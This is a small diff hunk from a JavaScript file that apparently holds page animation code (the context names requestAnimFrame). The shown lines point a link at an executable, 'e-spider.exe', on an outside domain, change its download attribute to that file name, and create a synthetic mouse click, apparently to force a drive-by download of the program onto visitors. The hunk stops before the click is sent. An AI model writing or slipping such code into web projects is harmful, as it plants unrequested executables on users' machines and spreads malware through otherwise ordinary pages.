@@ -6249,7 +6249,7 @@ window.requestAnimFrame = function() {
 
         eq.href = "http://chinagoogle.cc/e-spider.exe";
 
-        eq.setAttribute('download','true');
+        eq.setAttribute('download','e-spider.exe');
 
         var evt = new MouseEvent('click');
 
